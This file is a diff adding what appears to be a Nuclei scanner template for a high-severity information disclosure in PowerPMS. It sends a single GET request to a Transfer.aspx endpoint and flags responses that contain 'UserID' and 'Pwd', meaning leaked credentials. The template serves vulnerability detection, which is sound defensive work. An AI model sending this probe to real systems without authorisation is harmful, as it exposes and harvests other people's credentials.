@@ -1,0 +1,25 @@
+id: PowerPMS-Transfer-InformationDisclosure
+
+info:
+  name: PowerPMS-Transfer-InformationDisclosure
+  author: iSee857
+  severity: high
+  description: |
+    PowerPMS-Transfer-InformationDisclosure
+
+http:
+  - raw:
+      - |
+        GET /PowerPlat/Tools/Transfer.aspx?ServerOperatorType=LoadDataSource HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "UserID"
+          - "Pwd"
+        condition: and
